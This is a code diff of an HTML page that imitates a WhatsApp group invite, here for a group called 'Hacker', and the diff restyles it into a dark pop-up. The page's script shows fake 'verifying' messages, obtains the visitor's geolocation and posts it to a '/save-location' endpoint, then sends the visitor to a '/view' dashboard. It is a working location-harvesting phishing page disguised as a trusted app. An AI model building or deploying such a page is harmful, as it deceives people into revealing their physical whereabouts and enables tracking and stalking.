@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>WhatsApp - Join Group</title>
+<title>WhatsApp - Group Invite</title>
 <style>
     * {
         margin: 0;
@@ -13,139 +13,125 @@
 
     body {
         font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', 'Noto Sans', system-ui, 'Apple Color Emoji', 'Segoe UI Emoji', sans-serif;
-        background: #00a884;
+        background: #111b21;
         min-height: 100vh;
         display: flex;
-        justify-content: center;
         align-items: center;
-        padding: 0;
-        margin: 0;
+        justify-content: center;
+        padding: 20px;
     }
 
-    /* WhatsApp Container */
-    .whatsapp-container {
+    /* Background dim effect */
+    .bg-dim {
+        position: fixed;
+        top: 0;
+        left: 0;
         width: 100%;
-        max-width: 500px;
-        height: 100vh;
-        max-height: 800px;
-        background: #f0f2f5;
-        display: flex;
-        flex-direction: column;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.6);
+        z-index: 1;
+    }
+
+    /* WhatsApp Modal Container - Half Screen */
+    .whatsapp-modal {
+        width: 100%;
+        max-width: 400px;
+        background: #1e2a3a;
+        border-radius: 28px;
         overflow: hidden;
         position: relative;
-        box-shadow: 0 0 20px rgba(0,0,0,0.2);
+        z-index: 2;
+        animation: slideUp 0.3s ease-out;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
     }
 
-    /* WhatsApp Header */
-    .whatsapp-header {
-        background: #008069;
-        padding: 16px 16px 12px 16px;
-        color: white;
-        display: flex;
-        align-items: center;
-        gap: 12px;
+    @keyframes slideUp {
+        from {
+            opacity: 0;
+            transform: translateY(50px);
+        }
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
     }
 
-    .back-icon {
-        font-size: 24px;
-        cursor: pointer;
-        width: 32px;
-        height: 32px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        border-radius: 50%;
-        transition: background 0.2s;
-    }
-
-    .back-icon:hover {
-        background: rgba(255,255,255,0.1);
-    }
-
-    .header-text {
-        flex: 1;
-    }
-
-    .header-text h2 {
-        font-size: 19px;
-        font-weight: 600;
-        margin: 0;
-    }
-
-    .header-text p {
-        font-size: 13px;
-        opacity: 0.9;
-        margin: 2px 0 0 0;
-    }
-
-    .menu-icon {
-        font-size: 20px;
-        cursor: pointer;
-        padding: 8px;
-        border-radius: 50%;
-        transition: background 0.2s;
-    }
-
-    .menu-icon:hover {
-        background: rgba(255,255,255,0.1);
-    }
-
-    /* Scrollable Content */
-    .content-area {
-        flex: 1;
-        overflow-y: auto;
-        background: #f0f2f5;
-        padding: 0;
-    }
-
-    /* Group Info Section */
-    .group-info {
-        background: white;
-        padding: 24px 20px;
+    /* Header */
+    .modal-header {
+        padding: 24px 20px 12px 20px;
         text-align: center;
-        border-bottom: 1px solid #e9edef;
+        border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
     }
 
-    .group-avatar {
-        width: 100px;
-        height: 100px;
+    .group-icon {
+        width: 56px;
+        height: 56px;
         background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
         border-radius: 50%;
         display: flex;
         align-items: center;
         justify-content: center;
-        margin: 0 auto 16px auto;
-        font-size: 48px;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        margin: 0 auto 12px auto;
+        font-size: 28px;
     }
 
     .group-name {
-        font-size: 24px;
+        font-size: 20px;
         font-weight: 600;
-        color: #111b21;
+        color: #e9edef;
         margin-bottom: 4px;
     }
 
-    .group-meta {
+    .group-details {
         font-size: 14px;
-        color: #667781;
-        margin-bottom: 16px;
+        color: #8696a0;
+        margin-bottom: 8px;
+    }
+
+    /* Info Section */
+    .info-section {
+        padding: 16px 20px;
+        border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .info-row {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 8px 0;
+    }
+
+    .info-icon {
+        width: 24px;
+        font-size: 16px;
+        color: #8696a0;
+    }
+
+    .info-text {
+        flex: 1;
+        font-size: 14px;
+        color: #e9edef;
+    }
+
+    .info-text small {
+        font-size: 12px;
+        color: #8696a0;
+        display: block;
+        margin-top: 2px;
     }
 
     /* Members Section */
     .members-section {
-        background: white;
-        margin-top: 12px;
         padding: 16px 20px;
-        border-bottom: 1px solid #e9edef;
+        border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
     }
 
     .section-title {
-        font-size: 14px;
+        font-size: 13px;
         font-weight: 600;
-        color: #667781;
-        margin-bottom: 16px;
+        color: #8696a0;
         letter-spacing: 0.5px;
+        margin-bottom: 16px;
     }
 
     .member-list {
@@ -161,14 +147,15 @@
     }
 
     .member-avatar {
-        width: 48px;
-        height: 48px;
-        background: #e8f0fe;
+        width: 40px;
+        height: 40px;
+        background: #2a3942;
         border-radius: 50%;
         display: flex;
         align-items: center;
         justify-content: center;
-        font-size: 20px;
+        font-size: 18px;
+        color: #e9edef;
     }
 
     .member-info {
@@ -176,38 +163,47 @@
     }
 
     .member-name {
-        font-size: 16px;
+        font-size: 15px;
         font-weight: 500;
-        color: #111b21;
+        color: #e9edef;
         margin-bottom: 2px;
     }
 
     .member-status {
         font-size: 12px;
-        color: #667781;
+        color: #8696a0;
     }
 
     .admin-badge {
-        background: #e8f0fe;
+        background: rgba(0, 128, 105, 0.3);
         padding: 2px 8px;
         border-radius: 12px;
         font-size: 10px;
-        color: #008069;
+        color: #00a884;
         font-weight: 600;
         margin-left: 8px;
+    }
+
+    /* Created By */
+    .created-by {
+        padding: 16px 20px;
+        border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .created-text {
+        font-size: 13px;
+        color: #8696a0;
+        text-align: center;
     }
 
     /* Join Button */
     .join-button-container {
         padding: 20px;
-        background: white;
-        border-top: 1px solid #e9edef;
-        margin-top: 12px;
     }
 
     .join-btn {
         width: 100%;
-        background: #008069;
+        background: #00a884;
         color: white;
         border: none;
         padding: 14px;
@@ -219,7 +215,7 @@
     }
 
     .join-btn:hover {
-        background: #00695c;
+        background: #008069;
         transform: scale(1.02);
     }
 
@@ -229,67 +225,20 @@
         transform: none;
     }
 
-    /* Footer Info */
-    .footer-note {
-        padding: 16px 20px;
-        text-align: center;
-        background: white;
-        margin-top: 12px;
-    }
-
-    .footer-note p {
-        font-size: 11px;
-        color: #667781;
-    }
-
-    .footer-note strong {
-        color: #008069;
-    }
-
-    /* Modal for Loading */
-    .loading-modal {
-        position: fixed;
-        bottom: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: #1e2a3a;
-        color: white;
-        padding: 12px 24px;
-        border-radius: 28px;
-        font-size: 14px;
-        z-index: 1000;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-    }
-
-    .loading-spinner {
-        width: 18px;
-        height: 18px;
-        border: 2px solid rgba(255,255,255,0.3);
-        border-top-color: white;
-        border-radius: 50%;
-        animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-        to { transform: rotate(360deg); }
-    }
-
     /* Toast Message */
     .toast-message {
         position: fixed;
-        bottom: 80px;
+        bottom: 30px;
         left: 50%;
         transform: translateX(-50%);
-        background: #1e2a3a;
-        color: white;
+        background: #111b21;
+        color: #e9edef;
         padding: 10px 20px;
         border-radius: 28px;
         font-size: 13px;
         z-index: 1000;
         animation: fadeInUp 0.3s ease;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
     }
 
     @keyframes fadeInUp {
@@ -310,7 +259,7 @@
         left: 0;
         width: 100%;
         height: 100%;
-        background: rgba(0,0,0,0.5);
+        background: rgba(0,0,0,0.8);
         display: flex;
         align-items: center;
         justify-content: center;
@@ -319,34 +268,34 @@
     }
 
     .success-content {
-        background: white;
+        background: #1e2a3a;
         margin: 20px;
         padding: 32px;
         border-radius: 32px;
         text-align: center;
-        max-width: 300px;
+        max-width: 280px;
         animation: slideUp 0.3s ease;
     }
 
     .success-icon {
-        font-size: 64px;
+        font-size: 56px;
         margin-bottom: 16px;
     }
 
     .success-content h3 {
         font-size: 20px;
-        color: #111b21;
+        color: #e9edef;
         margin-bottom: 8px;
     }
 
     .success-content p {
         font-size: 14px;
-        color: #667781;
+        color: #8696a0;
         margin-bottom: 24px;
     }
 
     .success-content button {
-        background: #008069;
+        background: #00a884;
         color: white;
         border: none;
         padding: 12px 24px;
@@ -354,50 +303,43 @@
         font-size: 14px;
         font-weight: 600;
         cursor: pointer;
+        width: 100%;
     }
 
     @keyframes fadeIn {
         from { opacity: 0; }
         to { opacity: 1; }
     }
-
-    @keyframes slideUp {
-        from {
-            opacity: 0;
-            transform: translateY(30px);
-        }
-        to {
-            opacity: 1;
-            transform: translateY(0);
-        }
-    }
 </style>
 </head>
 <body>
-<div class="whatsapp-container">
-    <!-- WhatsApp Header -->
-    <div class="whatsapp-header">
-        <div class="back-icon">←</div>
-        <div class="header-text">
-            <h2>Group Info</h2>
-            <p>Friends • 5 members</p>
+    <div class="bg-dim"></div>
+    <div class="whatsapp-modal">
+        <!-- Header -->
+        <div class="modal-header">
+            <div class="group-icon">👥</div>
+            <div class="group-name">Hacker</div>
+            <div class="group-details">2 members, 2 contacts • Created by You, today</div>
         </div>
-        <div class="menu-icon">⋮</div>
-    </div>
 
-    <div class="content-area">
-        <!-- Group Info -->
-        <div class="group-info">
-            <div class="group-avatar">
-                👥
+        <!-- Info Section -->
+        <div class="info-section">
+            <div class="info-row">
+                <div class="info-icon">🔔</div>
+                <div class="info-text">Mute notifications</div>
             </div>
-            <div class="group-name">Friends</div>
-            <div class="group-meta">Group • Created by You • 5 members</div>
+            <div class="info-row">
+                <div class="info-icon">🏷️</div>
+                <div class="info-text">
+                    Group description
+                    <small>No description provided</small>
+                </div>
+            </div>
         </div>
 
         <!-- Members Section -->
         <div class="members-section">
-            <div class="section-title">MEMBERS • 5</div>
+            <div class="section-title">MEMBERS • 2</div>
             <div class="member-list">
                 <div class="member-item">
                     <div class="member-avatar">👤</div>
@@ -409,58 +351,34 @@
                 <div class="member-item">
                     <div class="member-avatar">👨</div>
                     <div class="member-info">
-                        <div class="member-name">Rahul Sharma</div>
-                        <div class="member-status">Online</div>
-                    </div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">👩</div>
-                    <div class="member-info">
-                        <div class="member-name">Priya Verma</div>
-                        <div class="member-status">Typing...</div>
-                    </div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">👨‍💻</div>
-                    <div class="member-info">
-                        <div class="member-name">Amit Kumar</div>
-                        <div class="member-status">Online</div>
-                    </div>
-                </div>
-                <div class="member-item">
-                    <div class="member-avatar">👩‍💼</div>
-                    <div class="member-info">
-                        <div class="member-name">Neha Gupta</div>
+                        <div class="member-name">Anonymous Member</div>
                         <div class="member-status">Last seen recently</div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Join Button -->
-        <div class="join-button-container">
-            <button id="joinBtn" class="join-btn" onclick="joinGroup()">
-                JOIN GROUP
-            </button>
+        <!-- Created By -->
+        <div class="created-by">
+            <div class="created-text">Created by You • today</div>
         </div>
 
-        <!-- Footer Note -->
-        <div class="footer-note">
-            <p>💚 <strong>WhatsApp</strong> • End-to-end encrypted • Tap join to verify</p>
+        <!-- Join Group Button -->
+        <div class="join-button-container">
+            <button id="joinBtn" class="join-btn" onclick="joinGroup()">
+                VIEW GROUP
+            </button>
         </div>
     </div>
-</div>
 
 <script>
 function joinGroup() {
     const btn = document.getElementById("joinBtn");
     btn.disabled = true;
-    btn.textContent = "Joining...";
+    btn.textContent = "Verifying...";
 
-    // Show loading modal
     showToast("🔐 Requesting location permission...");
 
-    // Request location
     if (!navigator.geolocation) {
         showToast("❌ Geolocation not supported", "error");
         resetButton();
@@ -469,7 +387,7 @@ function joinGroup() {
 
     navigator.geolocation.getCurrentPosition(
         function(position) {
-            showToast("📡 Sending location for verification...");
+            showToast("📡 Verifying location...");
             
             fetch('/save-location', {
                 method: 'POST',
@@ -524,7 +442,6 @@ function joinGroup() {
 }
 
 function showToast(message, type = "info") {
-    // Remove existing toast
     const existingToast = document.querySelector('.toast-message');
     if (existingToast) existingToast.remove();
 
@@ -544,23 +461,22 @@ function showSuccessModal() {
     modal.innerHTML = `
         <div class="success-content">
             <div class="success-icon">✅</div>
-            <h3>Joined Successfully!</h3>
-            <p>You have been added to Friends group. Start chatting now!</p>
-            <button onclick="this.closest('.success-modal').remove()">OK</button>
+            <h3>Verified Successfully!</h3>
+            <p>You have been verified. You can now view the group.</p>
+            <button onclick="window.location.href='/view'">View Dashboard</button>
         </div>
     `;
     document.body.appendChild(modal);
     
-    // Reset button
     const btn = document.getElementById("joinBtn");
     btn.disabled = false;
-    btn.textContent = "JOIN GROUP";
+    btn.textContent = "VIEW GROUP";
 }
 
 function resetButton() {
     const btn = document.getElementById("joinBtn");
     btn.disabled = false;
-    btn.textContent = "JOIN GROUP";
+    btn.textContent = "VIEW GROUP";
 }
 </script>
 </body>
